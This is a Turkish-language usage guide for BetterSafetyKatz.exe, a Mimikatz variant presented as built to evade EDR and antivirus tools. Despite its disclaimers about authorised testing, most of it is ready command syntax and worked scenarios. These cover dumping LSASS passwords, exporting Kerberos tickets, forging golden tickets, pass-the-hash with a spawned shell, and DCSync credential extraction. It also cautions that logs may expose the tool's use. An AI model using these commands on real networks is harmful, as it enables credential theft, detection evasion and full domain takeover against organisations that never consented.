# BetterSafetyKatz.exe Kullanım Rehberi

## BetterSafetyKatz.exe Nedir?

**BetterSafetyKatz.exe**, Mimikatz'ın gelişmiş ve özelleştirilmiş bir sürümüdür. Siber güvenlik uzmanları tarafından özellikle Endpoint Detection and Response (EDR) ve antivirüs sistemlerini atlatmak amacıyla tasarlanmıştır. Daha az algılanabilir olması, güvenlik testi ortamlarında kullanımı kolaylaştırır.

> **Önemli Not:** Bu araç yalnızca etik güvenlik testlerinde veya yetkili sistemlerde kullanılmalıdır. Yetkisiz kullanım yasa dışıdır ve ciddi sonuçlara yol açabilir.

---

## Ana Özellikleri

1. **Kimlik Bilgileri Çıkarma:**
   - LSASS belleğinden parolalar ve hash bilgileri çıkarır.
2. **Kerberos İşlemleri:**
   - Kerberos biletlerini döker ve manipüle eder.
3. **EDR ve Antivirüs Atlatma:**
   - İmzaları ve davranış tabanlı algılamayı minimize eder.
4. **Altın ve Gümüş Bilet Üretimi:**
   - Active Directory ortamlarında erişim için sahte biletler oluşturur.
5. **Kolay Kullanım:**
   - Komut satırı aracılığıyla basit ve esnek bir kullanım sunar.

---

## İndirme ve Çalıştırma

BetterSafetyKatz açık kaynak değildir. Farklı güvenlik topluluklarında özel erişim gerektirebilir.

1. **Dosyayı Hazırlayın:**
   BetterSafetyKatz.exe’yi sisteminize alın ve bir test ortamında çalıştırın.

2. **PowerShell veya CMD Üzerinden Çalıştırma:**
   ```cmd
   BetterSafetyKatz.exe
   ```

---

## Kullanım Parametreleri

Aşağıda BetterSafetyKatz.exe’nin yaygın kullanılan komutları açıklanmıştır:

### 1. **`privilege::debug`**
- Debug ayrıcalıklarını yükseltmek için kullanılır.

  **Kullanım:**
  ```cmd
  privilege::debug
  ```

### 2. **`sekurlsa::logonpasswords`**
- LSASS belleğindeki oturum bilgilerini görüntüler.

  **Kullanım:**
  ```cmd
  sekurlsa::logonpasswords
  ```

### 3. **`kerberos::list`**
- Kerberos biletlerini listeler ve dışa aktarır.

  **Kullanım:**
  ```cmd
  kerberos::list /export
  ```

### 4. **`kerberos::golden`**
- Altın Bilet oluşturur.

  **Kullanım:**
  ```cmd
  kerberos::golden /user:<username> /domain:<domainname> /sid:<domain_SID> /krbtgt:<krbtgt_hash> /id:<RID>
  ```

### 5. **`sekurlsa::pth`**
- Pass-the-Hash saldırıları için kullanılır.

  **Kullanım:**
  ```cmd
  sekurlsa::pth /user:<username> /domain:<domainname> /ntlm:<hash> /run:<command>
  ```

### 6. **`lsadump::dcsync`**
- Domain Controller’dan kimlik bilgilerini çeker.

  **Kullanım:**
  ```cmd
  lsadump::dcsync /user:<username>
  ```

### 7. **`misc::cmd`**
- Sistem üzerinde komut çalıştırır.

  **Kullanım:**
  ```cmd
  misc::cmd
  ```

### 8. **`exit`**
- BetterSafetyKatz oturumundan çıkış yapar.

  **Kullanım:**
  ```cmd
  exit
  ```

---

## Örnek Kullanım Senaryoları

### 1. Oturum Açma Bilgilerini Görüntüleme
```cmd
privilege::debug
sekurlsa::logonpasswords
```

### 2. Pass-the-Hash Saldırısı
```cmd
sekurlsa::pth /user:Administrator /domain:example.com /ntlm:<hash> /run:cmd.exe
```

### 3. Altın Bilet Üretimi
```cmd
kerberos::golden /user:Administrator /domain:example.com /sid:S-1-5-21-1234567890 /krbtgt:<krbtgt_hash> /id:500
```

---

## Güvenlik ve Önlemler

- **Yetkili Kullanıcılar:** BetterSafetyKatz yalnızca Active Directory yöneticileri veya güvenlik araştırmacıları tarafından kullanılmalıdır.
- **Test Ortamı:** Araç, üretim ortamlarında çalıştırılmadan önce test edilmelidir.
- **Loglama:** Sistem logları araç kullanımını tespit edebilir, bu nedenle dikkatli olunmalıdır.

---

## Kaynaklar

- BetterSafetyKatz hakkında daha fazla bilgi için güvenlik topluluklarına başvurun.
- Mimikatz dökümantasyonu için:
  - [https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)

---

> **Uyarı:** Bu rehber yalnızca eğitim ve araştırma amaçlıdır. Yetkisiz kullanımlar yasa dışıdır.
